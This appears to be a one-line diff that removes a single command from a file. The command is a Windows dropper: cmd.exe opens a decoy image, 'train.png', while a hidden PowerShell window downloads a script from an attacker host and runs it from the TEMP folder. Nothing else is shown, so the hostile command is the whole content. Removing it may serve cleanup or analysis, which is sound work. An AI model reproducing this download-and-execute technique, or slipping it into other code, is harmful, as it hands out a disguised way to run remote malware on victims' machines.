@@ -1,1 +1,0 @@
-cmd.exe /c "start train.png & powershell.exe -WindowStyle Hidden -Command "iwr -Uri 'http://atackbox/W4LLPEPP3R.ps1' -OutFile '$env:TEMP\w.ps1'; & '$env:TEMP\w.ps1'""
